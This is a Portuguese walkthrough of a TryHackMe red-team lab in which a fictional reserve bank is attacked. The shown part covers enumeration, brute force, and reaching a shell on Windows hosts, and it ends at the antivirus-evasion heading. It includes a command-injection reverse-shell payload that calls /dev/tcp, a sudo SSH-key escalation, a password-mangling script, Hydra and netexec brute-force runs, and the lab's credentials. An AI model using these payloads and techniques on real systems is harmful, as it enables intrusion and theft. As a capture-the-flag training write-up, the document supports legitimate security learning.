> [!Informações Iniciais]
> - O IP da máquina foi adicionado ao `/etc/hosts` com a URL `http://capstone.thm/`
> - Período: 03/06/2025 a 21/06/2025
> - Máquina do `TryHackMe` de Nível Díficil
> - Sistema Operacional: Linux & Windows
> - O que será abordado: OSINT; Enumeração e Fuzzing; Phishing; Evasão AV; Movimento Lateral; Exploração de AD; Testes de Segurança Linux e Windows; Escalação de privilégios; Exploração pós-exploração

# Tudo sobre a máquina

## 1. Visão Geral

A `TryHackMe`, uma empresa de consultoria em segurança cibernética, foi contatada pelo governo de Trimento para realizar um trabalho de equipe vermelha contra seu **Banco de Reserva (TheReserve)**. O mesmo tem duas divisões principais:

- **Corporativo** - O banco de reserva de Trimento permite investimentos estrangeiros, então eles têm um departamento que cuida dos clientes bancários corporativos do país.  
- **Banco** - O banco de reserva de Trimento é responsável pelo sistema bancário central do país, que se conecta a outros bancos ao redor do mundo.

## 2. Objetivo

O objetivo desta avaliação é verificar se a divisão corporativa pode ser comprometida e, em caso afirmativo, determinar se isso poderia comprometer a divisão bancária. Uma simulação de transferência fraudulenta de dinheiro deve ser realizada para demonstrar completamente o comprometimento.

Para fazer isso com segurança, o TheReserve criará duas novas contas bancárias principais para você. Você precisará comprovar que é possível transferir fundos entre essas duas contas. A única maneira de fazer isso é obtendo acesso ao SWIFT, o sistema bancário principal de back-end.

> [!Observação]
> _SWIFT_  (Sociedade para Telecomunicações Financeiras Interbancárias Mundiais)  _é o sistema utilizado pelos bancos para transferências de back-end. Nesta avaliação, foi criado um sistema de back-end central. No entanto, por motivos de segurança, foram introduzidas imprecisões intencionais neste processo._

No entanto, o backend do `SWIFT` expõe um aplicativo web interno em [http ://swift.bank.thereserve.loc/,](http://swift.bank.thereserve.loc/) que o `TheReserve` utiliza para facilitar as transferências. O governo forneceu um processo geral para transferências. Para transferir fundos:  
1. Um cliente faz uma solicitação para que fundos sejam transferidos e recebe um código de transferência.
2. O cliente entra em contato com o banco e fornece este código de transferência.  
3. Um funcionário com a função de capturador se autentica no aplicativo `SWIFT` e _captura_ a transferência.
4. Um funcionário com a função de aprovador analisa os detalhes da transferência e, se verificados, _aprova_ a transferência. Isso deve ser realizado a partir de um host de salto. 
5. Assim que a aprovação da transferência for recebida pela rede `SWIFT`, a transferência será facilitada e o cliente será notificado.

## 3. Escopo do Projeto

==Em Escopo==
- Testes de segurança das redes internas e externas do TheReserve, incluindo todos os intervalos de IP acessíveis por meio de sua conexão VPN .
- O OSINTing do site corporativo da TheReserve, que está exposto na rede externa da TheReserve. Observe que isso significa que todas as atividades de OSINT devem ser limitadas à sub-rede de rede fornecida e não é necessário o OSINTing externo à internet.  
- Phishing de qualquer funcionário do TheReserve.
- Atacando as caixas de correio dos funcionários do TheReserve no host WebMail (.11).
- Usar qualquer método de ataque para concluir o objetivo de realizar a transação entre as contas fornecidas.

==Fora do Escopo==
- Testes de segurança de quaisquer sites não hospedados na rede.
- Testes de segurança do TryHackMe VPN (.250) e servidores de pontuação, ou tentativas de ataque a qualquer outro usuário conectado à rede.
- Qualquer teste de segurança no servidor WebMail (.11) que altere a configuração do servidor de e-mail ou sua infraestrutura subjacente.
- Atacar as caixas de correio de outros membros da equipe vermelha no portal WebMail (.11).
- Coleta de OSINT externa (internet) .
- Atacar qualquer host fora do intervalo de sub-rede fornecido. Após responder às perguntas abaixo, sua sub-rede será exibida no diagrama de rede. Esta rede 10.200.X.0/24 é a única rede dentro do escopo deste desafio.  
- Realizar ataques DoS ou qualquer ataque que torne a rede inoperável para outros usuários.

---
# Visão da Rede

**Inicio do `Pentest`**
![](attachment/70a3b5ff021c04561d4cd88264133bf7.png)

**A Partir do 6º Tópico**
![](attachment/119b978b7896b4b5b4d9deb219c22eaa.png)

**A Partir do 7º tópico**
![](attachment/85ca4b1da958bf54c163acf6e303f498.png)

**A Partir do 10º Tópico**
![](attachment/c13e61f6ddb7b6ed2c510f3937003419.png)

**A Partir do 11º Tópico**
![](attachment/9b7060362d5e23abbfb3ff9883de664c.png)

**A Partir do 12º Tópico**
![](attachment/e642472b5259bc6b45120e3a8df26c84.png)

**A Partir do 13º Tópico**
![](attachment/16b62c8f80135aadeb5d08d55eee6f27.png)

**Redes/Máquinas TOTALMENTE Comprometidas!**![](attachment/b0e30b5dd00cc6d4e9ddad71560871ee.png)


---
# Sumário
1. [[#1. Registro no Projeto]]
	1. [[#1.1 Criação da Conta]]
	2. [[#1.2 Autenticação]]
		1. [[#1.2.1 `Submit proof of compromise` (Envie prova de comprometimento)]]
		2. [[#1.2.2. `Verify past compromises` (Verifique comprometimentos anteriores)]]
		3. [[#1.2.3. `Verify email access`]]
		   
2. [[#2. `IP 10.200.89.13` (WEB - Linux)]]
	1. [[#2.1 Enumerando a rede 13]]
		1. [[#2.1.1 NMap Listando Portas e Serviços]]
		2. [[#2.1.2 "Conheça o Time"]]
	2. [[#2.2 Gobuster Listando todos os diretórios e arquivos]]
	3. [[#2.3 Arquivos Expostos]]
	   
3. [[#3. `IP 10.200.89.12` (VPN)]]
	1. [[#3.1 Enumerando a Rede 12]]
		1. [[#3.1.1 Procurando Portas e Serviços com NMAP]]
		2. [[#3.1.2 Gobuster Será que existe algum diretório oculto?]]
	2. [[#3.2 Analisando a aplicação]]
	3. [[#3.3 Escalando Privilégios na Rede 12]]
		   
4. [[#4. `IP 12.100.1.8` (VPN Capturada da Rede 12)]]
	1. [[#4.1 `IFConfig`]]
	2. [[#4.2 Mapeando a Rede]]
	3. [[#4.3 Enumerando Serviços e Portas]]
	4. [[#4.4 Rotas]]
	   
5. [[#5. `IP 10.200.89.11 (WebMail & Windows)`]]
	1. [[#5.1 Enumerando a Rede 11]]
		1. [[#5.1.1 NMap Buscando por portas abertas]]
	2. [[#5.2 Acessando o E-Mail]]
	   
6. [[#6. Ataque de Força bruta]]
	1. [[#6.1 Ataque de Força Bruta usando o `Hydra`]]
		1. [[#6.1.1 `10.200.89.11`]]
		2. [[#6.1.2 `10.200.89.12`]]
		3. [[#6.1.3 `10.200.89.13`]]
		4. [[#6.1.4 `10.200.89.21`]]
		5. [[#6.1.5 `10.200.89.22`]]
		   
- ==[[#Primeira Flag]]==
- ==[[#Segunda Flag]]==
- ==[[#Terceira Flag]]==

7. [[#7. Bem vindo Ao Windows]]
	1. [[#7.1 Enumerando as `21 & 22`]]
		1. [[#7.1.1 Usando o NMAP]]
		2. [[#7.1.2 Enumerando Manualmente]]
	2. [[#7.2 Evasão do AV]]
	3. [[#7.3 Módulo `Power-View.ps1`]]
	4. [[#7.4 Escalando Privilégios da Rede `21`]]
	5. [[#7.5 Persistindo]]

- ==[[#Quarta Flag]]==

8. [[#8. Vamos para a próxima máquina]]
	1. [[#8.1 Enumerando a WRK1]]
		1. [[#8.1.1 Informações Críticas]]
		2. [[#8.1.2 Explicando alguns conceitos]]
			1. [[#8.1.2.1 Tudo sobre SPN]]
			2. [[#8.1.2.2 Tudo sobre Kerberoasting]]
	2. [[#8.2 Kerberoasting]]
		1. [[#8.2.1 Remotamente]]
		2. [[#8.2.2 Localmente]]

9. [[#9. `BloodHound`]]
	1. [[#9.1 Evadindo o AV novamente]]
	2. [[#9.2 Analisando o Active Directory]]

10. [[#10. Abusando de Privilégios para Movimentação Lateral]]
	1. [[#10.1 Entendendo os Comandos]]
	2. [[#10.2 Criação do Túnel com CHISEL]]

- ==[[#Quinta Flag]]==
- ==[[#Sexta Flag]]==

11. [[#11. Comprometendo o domínio CORP]]
	1. [[#11.1 Dumpando e Analisando os "Segredos" (`secretsdump.py`)]]
	2. [[#11.2 Conseguindo acesso ao Administrator]]
	3. [[#11.3 Criação de Conta com Privilégios Administrativos]]
		1. [[#11.3.1 `net user local`]]
		2. [[#11.3.2 Criação da conta no `Active Directory`]]

- ==[[#Sétima Flag]]==
- ==[[#Oitava Flag]]==

12. [[#12. Comprometendo o Domínio ROOTDC]]
	1. [[#12.1 Entendo Florestas de AD]]
	2. [[#12.2 Explorando a confiança transitiva]]
	3. [[#12.3 Obtendo KRBTGT Hash]]
	4. [[#12.4 Obtendo Domínio SID do CORP]]
	5. [[#12.5 Obtendo Grupo Enterprise Admins SID para Domínio ROOTDC]]
	6. [[#12.6 Mimikatz]]
	7. [[#12.7 Movimentação Lateral no Domínio ROOTDC]]
	8. [[#12.8 Criando uma persistência]]
	9. [[#12.9 Túnel dentro de outro Túnel]]
	10. [[#12.10 Resolvendo problema encontrado]]

- ==[[#Décima Quinta Flag]]==
- ==[[#Décima Sexta Flag]]==
  
13. [[#13. Entrando no Domínio BANK]]
	1. [[#13.1 Acessando outras máquinas]]

- ==[[#Nona Flag]]==
- ==[[#Décima Flag]]==
- ==[[#Décima Primeira Flag]]==
- ==[[#Décima Segunda Flag]]==
- ==[[#Décima Terceira Flag]]==
- ==[[#Décima Quarta Flag]]==

14. [[#14. Domínio SWIFT]]
	1. [[#14.1 Enumerando o Domínio]]
	2. [[#14.2 Informações cedidas pela própria máquina (Capstone)]]
	3. [[#14.3 Fazendo a solicitação de transferência]]

- ==[[#Décima Sétima Flag]]==
  
	4.  [[#14.4 Fazendo a captura das solicitações de transferência]]
	5. [[#14.5 Acessando a máquina `WORK1`]]
	6. [[#14.6 Autenticando com usuário com privilégio]]
	7. [[#14.7 Transações capturadas]]

- ==[[#Décima Oitava Flag]]==

	8. [[#14.8 Explorando usuários do grupo "Payments Approvers"]]
		1. [[#14.8.1 Acessando a Pasta do Domínio]]
		2. [[#14.8.2. Encontrando um Script de "Aprovador"]]
		3. [[#14.8.3. Aprovando a Transferência de U$ 10 Milhões]]

- ==[[#Décima Nona Flag]]==

15. [[#15. `SWIFT` Transferência Fraudulenta Concluida]]

- ==[[#Vigésima Flag]]==
---

# 1. Registro no Projeto

Antes de iniciar qualquer atividade, é necessário realizar o registro na plataforma, funcionando como uma espécie de autorização formal — semelhante a um cartão de permissão — que valida e permite a execução do pentest dentro do ambiente proposto.

> [!OBSERVAÇÃO]
> O usuário, IP e a senha de acesso via SSH foram gerados automaticamente pela própria máquina, fornecendo as credenciais necessárias para iniciar a conexão e realizar as etapas do pentest.

## 1.1 Criação da Conta

```
arthur-strelow@ubuntu-star:~/capstone$ ssh e-citizen@10.200.89.250
e-citizen@10.200.89.250's password: stabilitythroughcurrency

Welcome to the e-Citizen platform!
Please make a selection:
[1] Register
[2] Authenticate
[3] Exit
Selection:1
Please provide your THM username: antr4x
Creating email user
User has been succesfully created
=======================================
Obrigado por se registrar no e-Citizen para o envolvimento do Red Team contra o TheReserve. Observe os seguintes detalhes e certifique-se de salvá-los, pois eles não serão exibidos novamente.
=======================================
Username: antr4x
Password: jKXCZBwuT-EmyHTi
MailAddr: antr4x@corp.th3reserve.loc
IP Range: 10.200.89.0/24
=======================================
Esses detalhes agora estão ativos. Como você pode ver, já compramos um domínio para ocupação de domínio para ser usado em phishing.
Depois de descobrir o servidor de webmail, você poderá usar esses detalhes para autenticar e recuperar informações adicionais do projeto de sua caixa de correio.
Depois de realizar ações para comprometer a rede, autentique-se no e-Citizen para fornecer uma atualização ao governo. Se a sua atualização for suficiente, você receberá uma bandeira para indicar o progresso.
=======================================
Observe mais uma vez que a plataforma e-Citizen e este servidor VPN, 10.200.89.250, não estão no escopo desta avaliação.
Qualquer tentativa feita contra esta máquina resultará no banimento do desafio.
=======================================
Best of luck and
may
you
hack
the
bank!
```

## 1.2 Autenticação
### 1.2.1 `Submit proof of compromise` (Envie prova de comprometimento)
![](attachment/14930e33150356470e1d3768e75af0ed.png)

### 1.2.2. `Verify past compromises` (Verifique comprometimentos anteriores)
![](attachment/ac91aa87b1d7aecd5d9d8e9629a30287.png)
### 1.2.3. `Verify email access`
![](attachment/06e1b2e0770ceb76672fa986b20baa0d.png)
# 2. `IP: 10.200.89.13` (WEB - Linux)

## 2.1 Enumerando a rede 13

### 2.1.1 NMap: Listando Portas e Serviços

![](attachment/41ec553d5220fd55af3439fce3c957a5.png)

### 2.1.2 "Conheça o Time"
Na URL `/october/index.php/demo/meettheteam`, consta o nome completo da equipe, e isso é importante para possíveis enumerações de usuários em algum serviço.

```
Brenda Henderson (Bank Director)
Leslie Morley & Martin Savage (Deputy Directors)
Paula, Christopher, Antony, Charlene, Rhys. CEO, CIO, CTO, CMO e COO, respectivamente.
Lynda (Personal Assistance to thr Executives)
Roy (Project Manager)
Ashley Chan, Keith Allen, Mohammad Ahmed, Laura Wood, Emily Harvey (Corporate CUstomer Investment Managers)
```

## 2.2 Gobuster: Listando todos os diretórios e arquivos

`gobuster dir --url http://10.200.89.13/october/ --wordlist /home/arthur-strelow/SecLists/Discovery/Web-Content/raft-large-files-directories.txt -t 25`
![](attachment/894d1cf961fc79029a9257afdd3f186a.png)

`gobuster dir --url http://10.200.89.13/october/index.php/ --wordlist /home/arthur-strelow/SecLists/Discovery/Web-Content/raft-large-files-directories.txt -t 25`
![](attachment/e6cd2afa55631a62d4ebb9a84c98916b.png)
## 2.3 Arquivos Expostos

`/october/storage/app/media/info.php`
![](attachment/bbbd7f49bd4c62941d83c320902d6e0a.png)



![](attachment/8dea335d5424006d53e59f696e0e7cb4.png)
Presença de `.gitignore`? Será que há algum repositório Git exposto?
```
[-] Testing http://10.200.89.13/.git/HEAD [404]
[-] http://10.200.89.13//.git/HEAD responded with status code 404
arthur-strelow@ubuntu-star:~/capstone$ git-dumper http://10.200.89.13/october/.git cap
[-] Testing http://10.200.89.13/october/.git/HEAD [404]
[-] http://10.200.89.13/october//.git/HEAD responded with status code 404
```


`/october/index.php/backend`
![](attachment/ed150304f9f56b3a7549dabaa21ff844.png)



# 3. `IP: 10.200.89.12` (VPN)
## 3.1 Enumerando a Rede 12
### 3.1.1 Procurando Portas e Serviços com NMAP
![](attachment/4179a74666d508f1b29b04b76a183379.png)

### 3.1.2 Gobuster: Será que existe algum diretório oculto?

![](attachment/c50a735bf64d151a77d738ab91413ada.png)
Esse diretório `/vpn`pode revelar algo interessante.

**Acesso a VPN**

![](attachment/d38f98d4afce3d95a40209f65d93e4f5.png)

## 3.2 Analisando a aplicação
![](attachment/1ddfc6b529a3f17ec3a044c06a44e16a.png)

Após prosseguir com a enumeração e identificar dois usuários, realizei testes com o usuário `laura.wood@corp.thereserve.loc` para verificar se era possível burlar mecanismos de autenticação ou acessar recursos indevidos (bypass).

![](attachment/69b4772b90bd68fd4ae48a4878448d7e.png)

Observamos que, ao submeter o formulário via botão `submit`, a aplicação gera automaticamente um arquivo `.ovpn`, cujo nome segue o padrão `nome_enviado.ovpn`.  
Explorando essa funcionalidade, testamos a execução de comandos no campo de entrada e, com uma payload especialmente construída, conseguimos obter uma reverse shell da aplicação:  
`$(/bin/bash -c "/bin/bash -i >& /dev/tcp/10.50.87.116/9002 0>&1")`
![](attachment/96cbb6231b3bac72f27b9c37a5d645c6.png)
## 3.3 Escalando Privilégios na Rede 12

**Etapa 1**: Gerar chaves SSH na máquina do atacante:
`ssh-keygen -f shell_key -N ''`

**Etapa 2**: No servidor (máquina da vítima), criei o diretório `.ssh` e arquivo authorized_keys la no `/root`

```
mkdir /tmp/.ssh
/bin/cp shell_key.pub /tmp/.ssh/authorized_keys
sudo /bin/cp -r /tmp/.ssh /root/
```

**Etapa 3**: Agora é só conectar.
`ssh -i shell_key root@10.200.89.12`
![](attachment/bf405f85ebf6d9b5f8d561d64869fa1d.png)

# 4. `IP: 12.100.1.8` (VPN Capturada da Rede 12)

## 4.1 `IFConfig`
Ao conectar na `VPN`, temos um novo IP para analisar e, com isso, rodaremos um NMAP para mapear todos os `IPs` da aplicação, buscando o que pode haver de interessante nesse IP, já que sabemos que é um `/24` graças à máscara.
![](attachment/11055715219ee34979ba9485ab5e4388.png)

## 4.2 Mapeando a Rede
![](attachment/7556b338df0c84b78513b3f74a240de6.png)
## 4.3 Enumerando Serviços e Portas
![](attachment/3511d7179ff3c23ed13434db9ee591b7.png)

## 4.4 Rotas
Eu imaginei que a VPN poderia dar acesso a outras máquinas na rede em uma sub-rede diferente ou intervalo diferente. Irei verificar as rotas
![](attachment/557d32e18fed77d0ecfc4fa5541fc363.png)

> [!O que será que representa esses IP's?]
> **10.200.89.21 & 10.200.89.22**


# 5. `IP: 10.200.89.11 (WebMail & Windows)`
## 5.1 Enumerando a Rede 11
### 5.1.1 NMap: Buscando por portas abertas
```
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey: 
|   2048 f3:6c:52:d2:7f:e9:0e:1c:c1:c7:ac:96:2c:d1:ec:2d (RSA)
|   256 c2:56:3c:ed:c4:b0:69:a8:e7:ad:3c:31:05:05:e9:85 (ECDSA)
|_  256 d3:e5:f0:73:75:d5:20:d9:c0:bb:41:99:e7:af:a0:00 (ED25519)
25/tcp    open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
110/tcp   open  pop3          hMailServer pop3d
|_pop3-capabilities: UIDL TOP USER
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
143/tcp   open  imap          hMailServer imapd
|_imap-capabilities: CAPABILITY QUOTA IMAP4 ACL completed IDLE RIGHTS=texkA0001 NAMESPACE OK SORT IMAP4rev1 CHILDREN
445/tcp   open  microsoft-ds?
587/tcp   open  smtp          hMailServer smtpd
| smtp-commands: MAIL, SIZE 20480000, AUTH LOGIN, HELP
|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
3306/tcp  open  mysql         MySQL 8.0.31
| mysql-info: 
|   Protocol: 10
|   Version: 8.0.31
|   Thread ID: 15
|   Capabilities flags: 65535
|   Some Capabilities: Support41Auth, ConnectWithDatabase, ODBCClient, Speaks41ProtocolOld, IgnoreSigpipes, SwitchToSSLAfterHandshake, InteractiveClient, SupportsLoadDataLocal, DontAllowDatabaseTableColumn, LongPassword, LongColumnFlag, SupportsTransactions, Speaks41ProtocolNew, IgnoreSpaceBeforeParenthesis, FoundRows, SupportsCompression, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: Q\x17\x10S\x04x%mk`iLM\x15.\x07=~\x0ER
|_  Auth Plugin Name: caching_sha2_password
| ssl-cert: Subject: commonName=MySQL_Server_8.0.31_Auto_Generated_Server_Certificate
| Not valid before: 2023-01-10T07:46:11
|_Not valid after:  2033-01-07T07:46:11
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-06-03T18:53:44+00:00; -1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: THERESERVE
|   NetBIOS_Domain_Name: THERESERVE
|   NetBIOS_Computer_Name: MAIL
|   DNS_Domain_Name: thereserve.loc
|   DNS_Computer_Name: MAIL.thereserve.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-03T18:53:32+00:00
| ssl-cert: Subject: commonName=MAIL.thereserve.loc
| Not valid before: 2025-05-29T09:30:04
|_Not valid after:  2025-11-28T09:30:04
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
33060/tcp open  mysqlx?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49681/tcp open  msrpc         Microsoft Windows RPC
```


## 5.2 Acessando o E-Mail

As instruções fornecidas pelo servidor SSH (logo no início do `pentest`) indicavam credenciais de acesso a um e-mail. Com isso, foi utilizado um cliente de e-mail (neste caso, o Thunderbird) para acessar a caixa de entrada.

![](attachment/ee351fec4969c514a475b36cd516bc95.png)

![](attachment/08bdf5b7d734e7ce331eefffb557df46.png)

![](attachment/84debb4a37f5937ed4c64c57cad6a2f8.png)

```
(Texto acima traduzido)
Ei!

Meu nome é Am03baM4n, sou o Chefe de Segurança do TheReserve e seu principal ponto de contato para este compromisso. Estou super entusiasmado por finalmente termos aprovação para este compromisso. Tenho pregado ao ExCo sobre como precisamos melhorar nossa segurança.

Ouvi dizer que o escopo do projeto já foi compartilhado com você. Anote cuidadosamente esses detalhes e certifique-se de que eles permaneçam dentro do escopo do compromisso. Entrarei em contato conforme você avança no noivado.
Boa sorte!,
Am0
```

# 6. Ataque de Força bruta
Até o presente momento encontramos alguns lugares que precisam de autenticação, como:
- **10.200.89.13:** Painel de Administração do `CMS` de `october`
- **10.200.89.12**: Painel VPN (Porta 80)
- Serviços SSH e outros
- Servidor de e-mail `SMTP`

Também no início, coletamos os nomes de todos os membros da equipe e adicionei o provedor de e-mail que havíamos descoberto, ficando:
```
aimee.walker@corp.thereserve.loc
patrick.edwards@corp.thereserve.loc
Brenda.henderson@corp.thereserve.loc
leslie.morley@corp.thereserve.loc
martin.savage@corp.thereserve.loc
paula.bailey@corp.thereserve.loc
hristopher.smith@corp.thereserve.loc
antony.ross@corp.thereserve.loc
charlene.thomas@corp.thereserve.loc
rhys.parsons@corp.thereserve.loc
lynda.gordon@corp.thereserve.loc
roy.sims@corp.thereserve.loc
laura.wood@corp.thereserve.loc
emily.harvey@corp.thereserve.loc
ashley.chan@corp.thereserve.loc
keith.allen@corp.thereserve.loc
mohammad.ahmed@corp.thereserve.loc
applications@corp.thereserve.loc
```

E a senha foi gerada por um arquivo em Python criado pelo `GPT`, com base na política de senhas e no arquivo de senhas que a aplicação nos forneceu.

```
import itertools

# Read the base wordlist
with open('wordlist/password_base_list.txt', 'r') as f:
    base_words = f.read().splitlines()

# Define the numbers and special characters
numbers = '0123456789'
special_chars = '!@#$%^'

# Function to generate mangled passwords
def generate_mangled_passwords(word):
    mangled_passwords = set()

    # Append numbers and special characters
    for num in numbers:
        for char in special_chars:
            # Add the number and special character at different positions
            mangled_passwords.add(word + num + char)
            mangled_passwords.add(word + char + num)

    # Ensure all generated passwords are at least 8 characters long
    mangled_passwords = {pwd for pwd in mangled_passwords if len(pwd) >= 8}
    
    return mangled_passwords
    
# Generate passwords and write to file
with open('generated_passwords.txt2', 'w') as f:
    for word in base_words:
        mangled_passwords = generate_mangled_passwords(word)
        for pwd in mangled_passwords:
            f.write(pwd + '\n')
```


## 6.1 Ataque de Força Bruta usando o `Hydra`

### 6.1.1 `10.200.89.11`
![](attachment/99d5b1a4c338c67a3dc1f68ccbdc2354.png)

> [!Duas Credenciais encontradas]
> [25][smtp] host: 10.200.89.11   misc: (null)   login: laura.wood@corp.thereserve.loc   password: Password1@
> [25][smtp] host: 10.200.89.11   misc: (null)   login: mohammad.ahmed@corp.thereserve.loc   password: Password1!


![](attachment/426f3b6549db3f55cca9bc6114c08ce7.png)


![](attachment/b62571b343e00589db736c947984d92d.png)

Ambas as caixas de entrada não contêm nenhuma mensagem.

Tentado entrar no **SSH**

![](attachment/b7ac627fc5be68495c8c25a2a7bd13a0.png)


```
arthur-strelow@ubuntu-star:~/capstone$ netexec rdp 10.200.89.11 -u users.txt -p generated_passwords.txt2 --threads 10
RDP         10.200.89.11    3389   MAIL             [*] Windows 10 or Windows Server 2016 Build 17763 (name:MAIL) (domain:thereserve.loc) (nla:True)
RDP         10.200.89.11    3389   MAIL             [-] thereserve.loc\aimee.walker:TheReserve8# (STATUS_LOGON_FAILURE)
RDP         10.200.89.11    3389   MAIL             [-]
.
.
.
RDP         10.200.89.11    3389   MAIL             [-] thereserve.loc\aimee.walker:TheReserve0@ (STATUS_LOGON_FAILURE)
```

### 6.1.2 `10.200.89.12`

![](attachment/9bfa638f4d58192111e252613c1ee62b.png)

![](attachment/6e78b518c9822028f6fb14367e2f4092.png)



### 6.1.3 `10.200.89.13`

![[Pasted image 20250609175450.png]

![](attachment/c53e646e5598f32f4d9fe31ad34622e2.png)

### 6.1.4 `10.200.89.21`

Anteriormente, foram encontradas duas credenciais para acessar o e-mail. Então pensei: será que estão sendo reutilizadas?

> [!Credencial Reutilizada]
> laura.wood:Password1@

![](attachment/c00ca9112ee55ae728579ced5cfe54a3.png)

### 6.1.5 `10.200.89.22`

> [!Credenciais Reutilizadas]
> laura.wood:Password1@
> mohammad.ahmed:Password1!

![](attachment/2442b8e70e4e566c98385ae134a169a5.png)

![](attachment/3be7b694095252f67fd26b3167e5d65e.png)

# Primeira Flag

![](attachment/e22b09bc19cf395ff3b1571318d2b88b.png)
![](attachment/53da9cd9fd22ca46ae4b416fedf227b4.png)



![](attachment/e93f18e2678d790b09da9a1d774a7d0c.png)
```
(Texto acima traduzido)
Olá,

Não sei se te parabenizo ou não. Eu realmente pensei que nosso perímetro seria mais seguro! Mas parabéns de qualquer forma; de um profissional de segurança para outro, você realmente demonstrou suas habilidades de red teaming durante a violação.
Agora que nosso perímetro foi violado, você está um passo mais perto do seu objetivo final de facilitar um pagamento fraudulento. Ainda falta um bom tempo! O próximo item da agenda é se firmar no AD. Você vai precisar dele, pois o Active Directory controla o acesso à maioria dos recursos do ambiente. Somos uma organização relativamente grande, então a superfície de ataque aqui é bem grande.
Boa sorte!
Am0
```

# Segunda Flag
![](attachment/944c1465bd7599fdd3666c6a51542224.png)

# Terceira Flag
![](attachment/23627af5114d0ba5a7e927ae5d8fd4df.png)


# 7. Bem vindo Ao Windows
![](attachment/8834742e5222108e84589d4e3215dcbe.png)

```
(Texto acima traduzido)
Você está trabalhando bem rápido!

Há pouco você estava enumerando o perímetro e agora já tem acesso básico para funcionários! Bom trabalho, os executivos ficarão satisfeitos com esse progresso e ansiosos para entender como podemos evitar isso no futuro. Pelo menos você é um dos mocinhos, não é mesmo!?
De qualquer forma, tomamos precauções caso um de nossos funcionários seja comprometido. Portanto, não deve haver muito que você possa fazer com essas credenciais.

Mas vamos ver, prove que estou errado!
Am0
```

## 7.1 Enumerando as `21 & 22`
### 7.1.1 Usando o NMAP
```
REDE 21------------

PORT     STATE SERVICE       REASON          VERSION
22/tcp   open  ssh           syn-ack ttl 127 OpenSSH for_Windows_7.7 (protocol 2.0)
135/tcp  open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp  open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds? syn-ack ttl 127
3389/tcp open  ms-wbt-server syn-ack ttl 127 Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: CORP
|   NetBIOS_Domain_Name: CORP
|   NetBIOS_Computer_Name: WRK1
|   DNS_Domain_Name: corp.thereserve.loc
|   DNS_Computer_Name: WRK1.corp.thereserve.loc
|   DNS_Tree_Name: thereserve.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-11T11:59:38+00:00
|_ssl-date: 2025-06-11T12:00:13+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=WRK1.corp.thereserve.loc
| Issuer: commonName=WRK1.corp.thereserve.loc
5985/tcp open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found

REDE 22------------

PORT     STATE SERVICE       VERSION
22/tcp   open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds?
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-06-11T12:15:52+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=WRK2.corp.thereserve.loc
| Not valid before: 2025-05-29T09:30:23
|_Not valid after:  2025-11-28T09:30:23
| rdp-ntlm-info: 
|   Target_Name: CORP
|   NetBIOS_Domain_Name: CORP
|   NetBIOS_Computer_Name: WRK2
|   DNS_Domain_Name: corp.thereserve.loc
|   DNS_Computer_Name: WRK2.corp.thereserve.loc
|   DNS_Tree_Name: thereserve.loc
|   Product_Version: 10.0.17763
|_  System_Time: 2025-06-11T12:15:02+00:00
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
```

### 7.1.2 Enumerando Manualmente

```
PS C:\Users\mohammad.ahmed> net user mohammad.ahmed /domain

The request will be processed at a domain controller for domain corp.thereserve.loc.

User name                    mohammad.ahmed
Full Name                    Mohammad Ahmed
Comment
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            3/18/2023 9:28:25 AM
Password expires             Never
Password changeable          3/19/2023 9:28:25 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   6/11/2025 12:37:13 PM

Logon hours allowed          All

Local Group Memberships
Global Group memberships     *Help Desk            *Domain Users
The command completed successfully.

PS C:\Users\mohammad.ahmed> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
PS C:\Users\mohammad.ahmed>
```

## 7.2 Evasão do AV
